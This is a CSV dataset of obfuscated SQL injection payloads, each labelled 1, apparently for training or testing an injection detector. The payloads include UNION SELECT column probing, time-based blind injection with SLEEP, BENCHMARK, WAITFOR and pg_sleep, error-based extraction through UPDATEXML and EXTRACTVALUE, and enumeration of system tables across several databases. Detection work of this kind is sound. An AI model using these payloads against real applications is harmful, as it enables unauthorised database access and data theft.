payload,label
"1'+  ( ?SeLECT
WPAI wHere (SELECT""3685)=0o0x0o0o7945",1
"0x0~  )  !){  &As+msuG WHeRE 0o5o0o56735. lIke  8X0o0X9FD\aNd Sleep }(`=(sElect 0X1){ ) ' &&)""r"" liKE,""R"" AnD<""!"" not!likE~""!+""=AnD (sElect (SelECT (SELEcT (SELECT 2)))) 
AND{ True or`(SELECt (SELEct (SElECt 0))) aND)TRUe AND "":D""="":D""#_;*R",1
"4X0B15X0O3B0b0X0b111x0b0o9b9O0X0b11B110x0o0x0o0O0B0o0XbE'
/*PgXKq>;(SELEcT~(SeleCt
0b0X8o3))FaM;c|R*(SeLecT;0x0X6)
(SeLeCT~(SELECT 28))Lksw*/()?,;/*.(sElECT*(sELECt}0x0X0O0x5))Y0^NH
0O10e\p.kf}s*;;;Bs*/)(:)|
))$$unIoN_aLl
SeLEcT\nULL,nULL,NULl,NULl,NulL,NUlL,NUll,NUll,null,NuLl--",1
"Call rEGExp_SuBstRING  ( rEpEAt  (  rigHt  (  ChaR  ( ;0B0b111001110150  )	 ,0X0  ) {,(SElEct (SElect 0X1dcd0x1964))  )  ,NuLL[ )   &&    (   %(   'FRpo'|liKE 'fRPo",1
"1o0O0o0"" )~`-wHeRE 2b160011101801{=!(SeLEct 0o0O0b111110111100)%oR
sleEP/*T;Vmaw*/ (\	(SeLeCT (SeLEct+(SelecT!0x8x2b5001)))  );*  AnD < trUe ANd^0B0X0X0o0x271A LIkE@1X0O4106	AND
TRuE oR False\--",1
"9' Or { (  sEleCt 'gWXC' fRoM duaL whERe (seleCT(SELECT 3686))  =! (seLecT (SeLECt 3625)) aND
chaR  ( ?(select
0x6b){ )  ||chaR  (  0O171  )   Or chaR :(  0x63? )\ ||cHAr/*N-MG*/ (  (SelecT (SelEcT (sELEct80))) 
) | lIKe  rEGEXP_sUbsTRInG  (| RePEAT  (^ LEft  (  Or falsE oR False  AnD  tRue OR FaLSe OR 0#cRYpt_KeY '(  chAR ( #(sElEcT (sELECt 0X2E))  )   Or char ~(  (seLeCT 69)  )    Or  chAr (  (select (SeLEct (SELECT 83)))  ) ,nULl  ), ,0o0  )  ,0x1dCd0b1001510110A 
)  ,nULl &)   Or  'o' Not lIKe?'O'}OR '0O0wD' lIKE '0X3WD!' ANd 0X1 aND TruE AND (sELEcT 1) OR fAlsE  < ANd    ';0X6-g' Not LIKe ';(SeLeCt (SELECT 6))-g7X9' oR (SelECT (SEleCt 0)) Or falsE OR (selecT~(SELEct 0)) OR (sELect (SELECT 4071)) != 2071 OR ""LA*""  NOT  LIKE   ""LA*"" oR 0X0 oR FALSE --KB?",1
"1'	/*9Su+af8*/ )!   )[, AS<GRne	wherE*0o0x0o0O21013&=.	(SeLECT (SelECt""(SELeCT 0O0x138B)))=Order By]4X0o4--",1
"0b0o0o4B1""
and CHar  (  0x0o116  )    or  cHAr/*]<ho*/ (~ 0x66 `)   OR chAr  (<`0X75  ) }  oR  chaR (> (seLEcT (SElecT 0X5))! ) ;  lIKe  ReGexp_suBStRING  () rEPEAT$ (  RiGHT  (  cHar* (  0O24375  )  ,(SELeCt (SELECt (SeLeCt (SeLEct (SELEcT (seLEct (SELECT 0)))))))  )  ,0o43355753002  ) ~,NULl  )   && ""wrBS"" lIKe ""wRbs",1
"0X0B1""   )    )  ~ as HKrh WHERe!(sELECt.(sELECT 0x0xBf5))/**/='0o5460/*<bmxgPJ*/Or]cHaR  ( (seLect (SeLecT (SeLEcT (sELEcT (SElect (SEleCt 0x77)))))) )/  Or ChaR} (  0o152  )   .oR chAR$ (  (SELEct (sElecT 0b6X63))  ),  OR cHAR  (  0x79 ;) \ likE~rEGEXP_SubSTrinG !('(RePeat  (  RIGHt _(	 chAr [(  0B0o0b1101001011110000011000001011111011101  )  Or FAlSe#,(SElecT_0)|/*5jeb*/) .,(sElecT 0o5b0o0x0B0b100110111010000101101011100010010010012111000110110111310100010001011010101011000010100100001001101010000101101000110)  )@/,Null(^)  $Or  0X15E9 Like 0B0X15eA   &&   0x1{OR '$O0B0x8c'!='$o0b1000C'=--n",1
"7'  ) "" AND Or 0X0aNd'L'  nOT liKE  'l4B0O1751' ANd truE  &&  TRue  AND  True AND (SELECT 1)#CHar  (' 0x78 ,) "" Or chAr  (  0o350  )   oR CHaR"" ( *(sElecT (SelEct (sElect (SeLECT (sElEcT (SELEct (SeLECt (SeleCT (SElect 2x75))))))))) 
)   OR cHar  (  9X55  )   =[reGeXP_SubstRinG  (  RepEAt  (  rIGht  (  ChAr  (  (sELEcT (SeLecT (Select 8x26FD)))  ) >,(seLeCT 0X0b0)  )  ,0x69b28a6a0 ^)  ,null  )   aNd   (  'rqyz'< LiKe  'RQYz0O25t5K.	>d",1
"1""',) 
 As`KnDnWhere~0o0O0b10001100116001110  lIke/*w*&*/ 9318",1
"0b1   (  SeleCt   (  Case whEn   (  (SeleCT|4x8x9Ab)=(SELEcT 1x154B)  )   tHeN|regeXP_sUBSTRing  (  rePEaT  (  Right  (@ cHar  ( 	0x154b  )  ,0b2  )  ,(SelEcT (seLeCT (SelECT 0x60572f6)))  )  ,nULl  )   ELsE{cHAr  (  (seLeCt 0x6C)  )  ~OR char  (  0x0o4C  )]  oR char  ( 
0X1O106  )   Or ChaR  (  (selecT (sELecT (SELECT (SELECT (SELECT 116)))))  )   eNd  ) ^ FROm inf  OR  MAtIOn_SCHeMA.SYstEM_userS  )' ",1
"9 anD 0x0o24D7=  (
 sElECt COUnT  ([ * )   fRoM geNerAte_SerIeS  (  0b1,0x4c1b40-'%) ? 
)    oR (selEct 0x0) oR (SELeCT 689) NOT  LIKE  0o0b1010119501 OR false ANd (SeLeCt (seLECt (SELECT 1))) or false AnD 'CJJa' lIke 'CJja' OR False OR False#=TQMRL>fIU",1
"0O1   )+ & )   aS TNhY WhEre 0X452   liKE   (SeLECT (seLeCt[(sElEct 0b0x2544ab284))) aNd%(select (sELeCT 0x2628)) lIkE (SeLEcT 0O16224)  OR 
FALSE Or 'N' nOT/**/LIke''N' oR (SELeCt (seLect 0x138B))  LIKe <(SElect 0X738c) OR
falSe AND tRue#Zf<.1e6",1
"selECT&sLEEP/*(sElect 0X9)}YWNhw
Q*/ ( 3x2o2Xa> )+ ;    &&  ~  <{(/*j(NnV:KJNtcp9*/ ""%""+LIKe """,1
"1 WhEre 0B110111013010 }like  6XD8E'Or*(SELEcT (sELEcT (selECt 0X65F)))  =
, (:=SelEct couNt  (  * :)   from RdB$FiELDS'AS t1,Rdb$tYpEs	AS t0,rdB$coLLAtIONS As t2,rDb$fUncTioNs AS+T0O4]/*)CO_4&*/)    OR  
0X1d0b0O157c not   lIKE  ](selECt.(sEleCT 0x9O1D2C))&&TRue or FAlSE or FALSE ANd (sELEct (SELECT (SELECT 1))) --",1
"1'&  ) `/*+`]iG}*/ )      &&   0O0x9X5Ba  LiKe  BEnchmARK,*(+ 0X4c4B0x4o39,mD5?('.2X8X0O6d0b8X4F9C5]  )    )  +  or> FalsE or FAlSe OR FAlSe   &&   TrUE or faLSe AnD&(sELeCt (SELECT (SELECT 3x1)))#T8mG""0X6D2dleO~]N",1
"1/**/
)`:/*0b0O5g21O
v */ANd0b100XEf0>+=*beNcHmarK >(]`0O0X0b100c4b0o4,mD6X8  (
:0O0x0o4x0B109016100110021110041111010\()}+/*OZ&Z8SPE*R*/>)-(  aNd\  (: (sElecT/(seLeCT (SeLecT{0X0x1a82))) |LIke?<0O15202",1
"SElecT couNT/*(SelEcT (seleCT 1))/*/-( ** ) + frOm<dOmain.DOmaiNs aS	T5,DOMAin.COLUmnS AS%T2,dOMAin.tabLEs aS t3  anD. 0X1b39\oR false oR+faLSE aND/*\Cv,?*/tRUe aND trUE OR fAlse Or 0X906!=(SELECT (SELECT 2310))#NOT=(SELEct (sELECt 0b101115011010))#7oX{Y",1
"0B0b1100101o0B5B0B0O0X8o2o0o3B8%""=+?)J*/*J^;[*/`)

{\)\,!UNIon!all@SELecT nuLl,Null,Null,NuLL,nULL,NULL,NUll,NuLL,nULl/**/OR(False-aNd%TrUe\And`(sElECT (seLEct 0B10001001011))<>0b0B0b11000101011010100001100001001110110000100110101001001000111000101011101111010011000001010111111110110011001100~ANd~""Z""`noT lIkE ""ZO"" /**/or  (SELEct 0X0) oR fAlSe aNd 5177 Like 5177 Or 0#h[w;>0o1r, `i<\HVP",1
"1'   ).   )   <aS lMsl WHErE (SELECt 0O0o0O0b0b0b1110101100011001010100100101010010000100100001110111010100110111101011101111011110101100011011011001110100101101011001110011010000101)\= &6b0b111011011111010100100110101011100001001|or eLT _(/**/`(SELeCt 5872)  =  0X16F1,SLEEp  (  0X6 /**/ )  ` )  (.oR (SElect (sELEct (SELecT 0))) OR'FALse aND""'FO' Not{lIke 'Fow' Or""(SeLect (seLEct;(selECT 0))) or FAlsE oR (seLEcT (seLecT,512))!=(SelECT (SELECT 518)) or FaLsE
And ""D"" NOT LIKE ""di"" && (SELecT1) OR (SeleCt 0xc06)=3079 Or false Or=""!"" nOt LikE ""!""?oR<FalSe anD TrUE#=lk",1
"1""/ ^)/   )     )   or ElT/*4g6[O+k^B^$`Zckq*/ (=0O0b410O0O0o0x2b0b1100111011000110001010110111011001010  lIke  (seLect (SeleCT 0x0b0b1010010101101011001011125110001100)),SLeEp  (  8X0X0b100  ))	$ )?    &&  </*+/ZY*/ (    (   /*0x5O;6TAOQ5*/ ( {""HxGU""=""HXGU",1
2O0b1' -)<]As]tWNYWhErE/**/(selECT 4580)	 Like^ 0B10010701110110,1
"8'   )  ? )*    )    (  SelecT - (  cASE wHEN 	 (  0b0XEb85B29AA1b0  and 'Rb' lIKe!'rB'?OR""'\' oR (sELECT 9O3x158F)!=(SeleCt 5X1587) OR faLSE;. &&   0x1   &&   'lve' <> 'Lve$' aNd tRuE Or faLSe /**/AnD  0x0b101x33e3 != (sELEct (SeLect (seLECt;0X0o14Da))) Or ""Hr"" NOt lIkE ""hR"" Or (SElEct (SelECt (sElecT 9X0)))  AnD  True oR fAlSE:OR ""kb""!=""kB"" oR fALSE aNd truE AnD trUE ANd (Select (sELect (sELeCT (SELECT (sELECt 0X1))))) Or FalSE aND trUE OR FALsE anD tRuE AnD trUe and tRue OR 0o0 aNd TRuE AnD (SElecT (SeLECT 0o1)) Or (sELEcT (SELECT (SELECT 0))) aNd ""s"" LIkE ""S"" or FaLSe OR (SELECT (SELECT 0))#not lIkE_'\' AND 'BD' NoT LikE 'BDr' OR FaLSe#=  0x650b  ) & tHeN rEGExP_SuBStriNg  (  repEat (  RIGHt  (  ChaR  (  (seleCT (SelECT/(sEleCt 7X547))) ;)  ,8o0@&) .,0X1dCD6308  )  ,Null  )  noT LIKE elSE CHAR[ (  3X6c  ) ) oR cHaR  (  0X4C {)  ?Or>Char  (  0O156 	) 	 OR@chAr  (  1b0B1x0o0x4f /*:A|]xVV oo~`9lEY>4hGR*/) ~ enD  )   FRoM+inFormaTiOn_sCheMA.sysTEm_UsErS  ) "" &&   (    (     (, 'BVDw'  LikE  'bVdWkx:Bts& e2",1
"1"" Or/**/UpdATEXml .(  0x1a98,cOncaT (  0O0B3o2X2E,2x0O0x7171776A71,	$( <SELecT   (^ elT[_(  0B11101010110 +lIKe  (SElECt (SElECT`(seLECt (selECT (sELeCt (SeleCt 1007)))))),0o1  ?)   )    )) ,9X0x2caA81a78  )  ,(SELEct](sElect 2x21DA))  ) ]",1
"0b1""  %AnD   exTrAcTvalUe]!(  (SeLecT)0X1f2e),cOncat:!(  2b0X0B601C,0x0O0b0b11101011010010010110011001011010000000011101011100110100001111001117151011100000a8B1010111,
 (  seleCT ] ( 
ELT!*(  0x1F2e  lIKE  0x4F34,0O7X1   ) ] )    {)	 ,0X0O1315a0b1011111111a79}  )    )   AND""eIUC""@liKe ""EiUc",1
"SEleCt(sLEep  ((-0B0b0x8B0o8B0b0x5o5B8o0O0X27B/*j*`(seleCT0x4)0j	*/ );	AND) ;>( /**/ ""( * 'srfc'`lIKE('SRfc",1
7X1 &){>+WaITFOr_DElaY''9:5b0X0X0O0:0b129'and_-~(<	(SeLEcT'(seleCt 0XBB9))=6993,1
"0O0""?{)  	wHeRe((sELeCt>8O4x0b0o0B0o10150315392)  likE ;(sElect (sELeCt 0x0X0o5bA))	/*|0kIrDwd_Kc$~?;~P;*/      oR    $`\ (SElECT	(SeLeCt (sEleCT (selEcT 0B0o38955105345560))))=^<(  seLecT?cOUNT/*MoX  ]Baz(0x0B0B5O9Fd!rp{Z+ND)?qCw""*/=( _*[?)  /*""|/2g)r)8c%Jz?A HysZUkW^:kQZEWFcigiu7s*/FROm/sysuSErS:As^SyS9,sySUseRs[AS]Sys0O0o0o0O2,sYsuSErSAS=sYs0O0o7,SYSUSERS\As~sys7,sysuSERs aS:sYs0o0X0B0x0O3,sysusERS`as syS4,SYsuSERs)AS
SyS0B1xa \) }]Or\~falSe anD\(SeleCt)(SelEct)0x1)))    &&  	  tRuE)--",1
"0x0b0B111B0""++\)&^\) 	",1
"0X0O1 whERe (SeleCT 0XA0o3f)  LiKe  (SELECt@(seLEct!0XB07)) ANd 0O2X8xE0b1O0b10011101B \=   /**/(} selECT coUNt  (  * )  :fRoM SYSiBm.sySTableS aS t1,SYsIBM.SYstAbLes'As t6,SysIBm.sYsTABLeS as t3  )    &&   0O0B105720001100 LiKe
0O4617 AnD (SelEcT 0xA3f) NOt  likE  (selEcT (sELecT 0x0O0B1100910111010)) Or 0o10x9 or 'd'='DK'oR\fALSe AnD 'I'<>'I5B0B11'; AND) ""wgAG""=""WGAg"" OR 0x188C<>(seleCt (SelecT)0X171c)) And TruE aND TrUE ANd trUe oR FALSe  AND  0o0x8 ANd (selECT (seLECt  OR  ',/UWe'<>',/uwe' OR FalSE oR ""/>"" LIkE ""/>}"" oR FALSE Or FalSe AND True#(SELECt 0O0x1))) AnD tRuE ANd TRUe oR '$E' not='$e' oR (sELeCt (seleCt (selECt (SeLECt (SElEcT (SeleCt (SelecT (seLECT (sELecT (sELECT (SELEct (SELECT 0)))))))))))) AND '	R' noT Like '?R^' or faLsE --{dLPIp.",1
"9' in boOLeaN mOde  )
   AND  6x1b32  LIkE    (  sElECt (SELECT,0x4b39) FroM pg_SleEp[ (
 0x5	 ;)  `
)    Or`'e='<>'e=''or fAlse  OR  False OR False#T4diNV`}",1
"0o10x0O0O0x1%""(aNd
eLT>$(' 0B0o10231/*e+(SeLeCT (seLECt`(SELecT 0X5)))|Vj4~Ve.OA*/ Like,
(SeLEcT+0x0x0o1913),0b1110010117011	>) /'9*  &&  ;_""%""+< lIke%+}""",1
"0X6' WHere 0o0X958  LIKE  0x0o1813  &&  (seLecT (sELect (sELECt (SELEct 0X8cD)))) =( cAST   (    ( , chr  ( ^0O8O0X41  )
 ||cHr  (  (SELect 0x71)  ) 
||Chr( (  (seLeCT (sELEcT (seLEcT (SELECT 152))))+ ) ; oR chr  (  (sELect (SELecT (seLECT 0xc0)))  )   or cHR  ( }(selECt (SElect!0X73))\  )  ; ) 
~oR  (  SeLECT   (  CaSe WHen  ;(! 0o5445 like (selECT 0xB45)  ) /*^LNS-D|TA:uZdd*/ THEN 0X1 Else	1o0b0x0 eNd + )    )   ::teXt oR   (  chr  (& (selEcT 0x75)  )  ?  OR [}Chr  (  0x7A  )   oR chR  ( ;0x76  ) {||CHr  (  0o0x0A  )\ ||ChR  (  (seLECT!0X71)&  )    )    As NUmerIC  )/*+)}>41Fn?*/ or 5X0o0 or/(SEleCt (SeLecT (selEct (selecT (SELECT 3))))) or (selecT$(SelECt (SeLECT 0X3))) oR fALsE   aNd   TrUe or FALsE ANd ""0X7"" Not LIke ""0b0B0x42296945|""  AnD &TRuE Or faLse OR '7B12x' noT  lIkE  '0o9x' or 3x5  or  FAlsE or (SElEct (sELeCt 4x0))  &&  0x1 or FAlsE   &&   TRuE anD TrUe and ""FXY`""=""fxy`""|ANd (SeLEcT (SelECT 0X1))  AnD  trUe oR fAlse oR False OR fAlse Or falSe Or falSe  &&  (SEleCt (SELECT 1)) oR 0x0 oR faLse Or FALsE --",1
"0b0X0b0x0B0O7O0B1<$)>	[where~(select
9o4O0B110b0O0O0b0o0b0o101432){=\(sELECT$0O5b0O8x0o4x6a4X0b0b0B11110110100111111010))UnIOn+alL&SElecT/nUll,NULl,nUll,Null,nuLL,NuLl,NULl,nuLL,nULL--",1
"selECTcoUnt:&(""*??)&@`From=sySIbm.syStablES&aS|T0B0B0x64,sySIBM.SysTABles*AsT0b7o0B0o0b0X2,Sysibm.SYStAbLESAS/*W(SElEct*1b5x0B1041)>(selECt!0x0B0x1b1011)oC{BJ=i45<[q#e`*/t3b3O0b0X0O0O0B0x0o2q`",1
"0b0x0O0o5""~uNiON[All}SeleCt[NulL,NuLL,NUlL,Null,nUll]or 0o0b1x6<aNDtrue+AND/*a1o**/(SELECT 0xc1b) NOT  LIKE<?(SELECT (SELECT 3106))#0B120x  HKo[]qGeQ9hzn",1
"SElect%COunT^((**?%)\[fRom/*(SelecT:(SelecT!(seLect`2x29))):>=xRp (sELecT!(Select$0x2))B'vtA^m9L-AHP0b1001*/rDb$FIeLDs
aS>T9,RDB$TYPES!As t0o5,rDB$cOLLATIons:as-t0b9b0o0b1105,rDb$FUNctIons/*H""vy(NXS`Yo}pxEJk*/as""T1B0b4740100--",1
"SeLEcT sLEep!/*0S*/({
(SelEcT (SEleCT 0x0O5))  ) &&tRuE&--.hLGt",1
"1X1' /*1NBg:/fBb*/ )    )     ) = (  SeLecT+  ( 	CASE whEn  \(  (SELeCT (SeLECt (sEleCT (SEleCT (SeleCt (SElECt (selecT (SelEcT (selecT (SELECT 4585))))))))))?/*&eX)*/liKE  0x11Eb  )   THEn REGeXP_sUBSTRIng ^(  REPeat, (  lefT  (  crypT_Key|(/*)*k@(cHAR  (  (SElEcT*0x0B101901)  ) ||Char  (  0x15  )   OrcHar  (  (SeLECT 1b1918082)  )',nULL ;) 	,0b0o0  )! ,0x0X0o0o0B1dCd6500  )  ,NUll  )   ELSe cHar  ( >(SelECt 0X4c)  ):  or chAR[ (  (SELect (selECT (seLEcT (SelEcT (seLEct 0B0b0x41))))) >)   Or cHAr  ( @(sElecT 0o5)  )    OR  cHaR  (% (selEct (sEleCt 2X48))  )   enD  )   FROm   (  valuES )(* 2b9o0 _ )    )     )  And   (|   (    (  'sQnK'='SQNk",1
"1'/**/  ) : *)  `?As ytFIwhErE<5B110011111016 ;LiKe/*)M*(SelEcT (SeLEcT*8x5C))0O3mew=nN8zbT<*/0o0o2738_  &&   0X4O0O5b0x9o0O38e0x2D0A8Fb9dB4`  LIKE  ;Like!?(['aBcDEfg',UPpeR, (  HEx: ( ~RaNDOMblOB  (  0O0o0X0x9Dcd0X0o0B0X0o7b11101110011010/0b0xa: <)  ^ )    ~)    ) :*/` &&   ,trUE%oR&fALSE   oR (?(sElECT 0O1x0O0B0)+anD!(sELecT-0x0x1)
--",1
"1',{ (  selECt ; (  casE WheN&  (  0X0b101101001110=8556  )   TheN (sElECt (seLEct (SELECT (SELECT 2)))) Else (sElect 0O14704)*
 (  sEleCt 0O20624 fRom mySQl.dB  )   End	  ) , )   ",1
"8' [ )  _)     )   &&[0B0o0b0X98ae410E0fc
 LiKE ; (  'QQpjq' Or'  (  sEleCT CAsE 0x6458^wHen 0b110010101051 THEN (SeleCT 0o5) eLse (selEct;(seleCT (SelEcT/(Select (selEct (SELECT (SELECT 0))))))) ENd FroM-RDB$DaTABAse  )  ?OR 'QZvZQ'- )  ~anD   (    (    \(  'SNOA'/*Z5i{(SeLecT+57)?'Xt7)(SELECT 3)*/ like ~'SnOa",1
"4""
WhERE|0O0O0b0b30091100110110%=_(seleCt[0x1X1B0b0b11110100001001001010) aNd (SEleCt;(select (SELECT 0x1369)))  lIKE   ( ;Select 0B1105100131501{fRoM|PG_slEEP  (  2X5  ^) $ 
)   Or?(sElECT:0)/*)f0b0x0o0c	T*/aND 1+--",1
SElECT^CAseWheN}0X7X8B8]lIKE{8B9X0X4CD_thEN^0x8X9:eLSe@nUll/*){oW\(SELECT	3)$%H*/eNd--,1
"0B111B1'   )   /) _ 
as]UUuK WherE?0b12110100010100  LIkE  (SEleCT/(sELeCT 0x146E)) aNd 0B0o0x0x0x19ED=DbmS_Pipe.rEceive_mEssaGE) (  CHR  (  (sEleCt 3X0O4E)  )!- oR cHr  () (SELeCt (seLect 0XD8)) >)  ||cHr  (] (SeLEct 0X0XD0o5) -) / oR cHr  (} (SelECT 0x4B)  )  ,(SeLect 0x5)= ) ;oR
fAlSe$oR
(SEleCT (SelecT 0x0)) Or (sEleCT (sElecT (seLECT (selECt 1304)))) NOT lIKe`0o2230^OR_false@aND 6X0X0x320 <> (seLect (sELeCt (SEleCt 2049))) aNd "")EW""<>"")eW0B10"" or 0o0x0  oR  fALse aND=TRue oR FaLSE And tRUe --",1
"0x0x1O1'. )'<.aS mQxBWHERe2x19bf*LIke+	(SeLEcT.0X3967)/*(selEcT\0x0o0B1101)& or  faLSe)OR<FALSe OR FaLseOR=FalsE#(seLecT	(SELECT 0x4))&&oCe*/And	0X4X5fd""=}_3555--t",1
"0O4x0O0B0b0B10o7B7X4o8O0x6X9o0b0x0x56B0O0X6b9o0b101X9B9B7O3b8x0b111X0b0b0B1111101001B0b0b0x5x0O10X0o1x0B8b0b1230b0x0b10x7%']uNIon~aLl&seLeCT!nuLL,NUlL,NulL,nULL,nulL,nuLL,nULl,NULl--",1
"1'?
)]WHeRE,0X0o12ca~=@0b10100010010",1
"0'     Or    (seLECT/(SelECT (SelECt 0B0B7X515)))= :(/*(selecT (SeLECt (seLECT (SelecT (SElECt (SELEct (sELECT (select 6))))))))*/ selecT cOuNT]/*[*/() * ;)(  frOm rDb$fIELdS as t6,rdB$TYPes'aS t7x9B0,rdb$cOLlAtIOnS=aS t3,RdB$FUnctiOnS As!T0x2  )  $aND 'yNpR'  =( 'yNpR",1
"0X1' OR  ~( (SelecT 'IoCs' Where 0o0o0X0xD1E7  liKE  (SeLEct (sELECT (SElECt (selecT (SeLeCT (sElECT (sELeCt 9287)))))))  anD +(selECT 0x00d7)   lIke  _/**/ ( &sELEcT coUNt  (  * ) + fRoM GenERaTE_SERIeS  (  (seLEct 0B1),0B0X23f3d5F03F6E91b82D5   ) ;  )     )   or '",1
"0X3X0o0b4`-\)<]&)|`%:AS>Khvx=WHeRe,(SeLEct/8X5O0O0o0X8O0O3X9o7B0o9B0x0O3x0o1x0X6x5B0O5b0o11o2O2X6b4B0b11011001000000101011000X0B3B115X0b3X9O0o0O0b410B83d0d):]liKE$^(SELeCT>4X0X6X1o0XFdd)(uniOn?AlL$sElecT\NUll,nULl,NUll,nuLL,null,nulL,NUll,nULL--",1
"1',IN}booLeAN MoDe  )	   -`AnD ;  ~0B8x6a15%=    ( &SElECTCoUnt  (  *  )   FrOMAll_uSErst3B7b110,ALL_uSers T0b3x0x9,all_uSeRST0o0O0xA,ALl_USErs[t6,aLL_usERs T0O5 <)   'OR
/BP0!(sELeCt (SELECt 7))Z.QT4*/>a0B0O0b7*/ FALSE;And]0B0xbaf noT liKe 0X0xBB0B3%aNd TRUe Or 0X6  Or  0x0X0\or faLSE=oR fAlse OR FALSe and6x1 Or faLSE OR FALSe or FalSE]--",1
"4"" 
)  +as_jTou<wHERe(seLEcT*0x1fc1)`=/*=;<C/|_9*/ 0x2151(anD?(seLECT=(SeLect 4x1d6d))+=/0b0o1751x0O8x5X2D8x0B710d--",1
"5 	)

 WhERE/**/0x0B11800411e; ;  lIKE     3X1896",1
"sElECT COuNT  (_ *  )  !FrOm GEnEraTe_SErIeS /*>(SeLECt 0o1),A)*/(  4,0B0b0b101101010001110110010111100011011001011111000000110101101100011000101101011111001000001010010000110000011010110011010100000011111000111000100010110010010010101011110010000011010001001101110001010001111101001101011101001011010110001010001100010  )  'and
'DfWj'  LiKe 
'DFwj",1
"5'+  (>sELECT lUwN wHeRe 9X4Be=0x7BE
Union alL~sElecT(NuLl,nUll,NuLL,NULL,nuLl,Null   &&   (Select 8x1fdd)LIKE^(SEleCt 9X0o1FDf);oR (seLeCt (sElect (SelecT (SELECT 0)))) Or fALSE ANd""""G"" noT/**/like ""gL"" oR ""8""=""7g"" aNd 'Pv^_t' lIke 'Pv^_T' or fAlse OR FaLsE aND tRUe#cHF7p;7p*6ywt",1
0B111O1%': ^)/   )     )`;*AnD^(SElect[(SElECt (SeLECt	0x0B111D0))) =	5006,1
"select""sleep !(  (SELECT (SELECT (SELECT 9)))    OR   '[k'='[kM' OR False OR (SELECT 0)#)   and 'gajm'   LIKE! 'gajm",1
"1""?  )  , )  &  )    OR    (  sElECt (SeLecT 0B0x0)*  (  If  +(	 $ (   sELect *fRom   ( -SELeCt CoNCaT  ( *5X7171714a71,  (  SElEcT   ( elT  (  (selECt 0x0x1fB0b1)  like  (SelECT 0X1fb1),(SElEcT (SeleCt (SelEcT (SelECT (seLeCt (sELeCt (sELECt 1)))))))   )    )     ) ',0x717a5o1377a71,0b0X38   )  :^)   S  ) _, (sELECt (selecT 0x7538E09eC8Ac3Ffa)), (sELeCT 0o724733247103267475772)   )    )  |  )   And   (  
 (     (  ""TWPn"" lIkE ""tWpN",1
"0B0b0O8B5O5B2O0b0o0B0o0""@\)] ~ )>?}>oR{0b0o0O0B0B0O0x3B0X104B
 LiKE <; ;( ;seLECT=COunT :(( *\?) ;*fRoM}SysUSErS)as@sYs0o0B0B0B0o0xaO2,SySuSeRs/aSsyS0x3,SySusers'as?sYS4b110,sysusERs As/*S{|]k?M@py__-`s*/sys1,SysUsERs[aS SYS0O5,sYsusErS:as]SYS0o0Xa,sysUSerS%as]SyS0B0o0X0O6f\\)
aNd !( ^+ ( ; ""wdyE"">LiKE
""wdye",1
"3',  (  sElEcT   (  cASE WHEN   (  (seleCT (sELect (SEleCT (sElEcT (SELeCT 0Xf40)))))^[ LiKE   (sELecT 0Xf0b11E)/**/ ) @	then  /*q I^2IvDNj */(  seLect COuNt  (  *  )  /**/fROm all_UsErs T0b1,aLl_usErs T2,All_useRS t0o4,alL_UseRs;T0o4,ALL_useRs t0x5  )=  else&(sEleCT (seLECt (sELeCt (selECT (Select 0X1)))))/  (  seLEct
3x4 fRoM DuAL  )   END *)/**/  FRoM dUAl  )  ",1
"1,Iif=`(  0X494	Like&0O0o25374,0X0x1,0X1/(SeleCt!or[FalSe or FAlSe  oR  FAlSe.oR	FALSE AND (sElecT (SELECT 1)) OR	0#(selecT 0x0))/*`J*/ )  3""}",1
"0X5'   )   -) ,   )   and&(sElecT (SELECt (SeleCt (SeleCT (sELECt (seLeCt 0xB2B)))))){-=  cASt   (  	 (   cHR) (  0X78  ) ` OR ChR;*(  0xB7  )   or cHr +(  (seleCT 0X70) =)   Or CHr  (  0X0X1O8X6a  )   Or Chr? ( ^(SeleCt (SEleCt (sELeCT 119)))   ) ?  )   || [(  SelECt  (  CaSE whEN   ( >(SELecT((selEcT 0x62f9))   liKe   (sELECt 0X0xB0b111)  )   TheN 0x1 eLse (SElect (sELECt 0x0)) EnD   ) + ;)   ::tEXT oR  &(  CHR  (  0o161 	)   or cHR  (  0X0o0x56  )   OR cHR  ( }(seLECt (sELEcT (sEleCt 0x0x267)))  ) & oR cHr  (  0B0B10001110  ) @ Or CHR  (  (SeLEcT*(seLEct (SElEct (sElecT 113))))/  )  /(seLeCt (sELEcT 0x0))
kk7G*/ziEIN[w""*/ )    aS'NUmeRIC  )) AND  ; (   :(    ~(  'gEGg'   LIKE   'Gegg",1
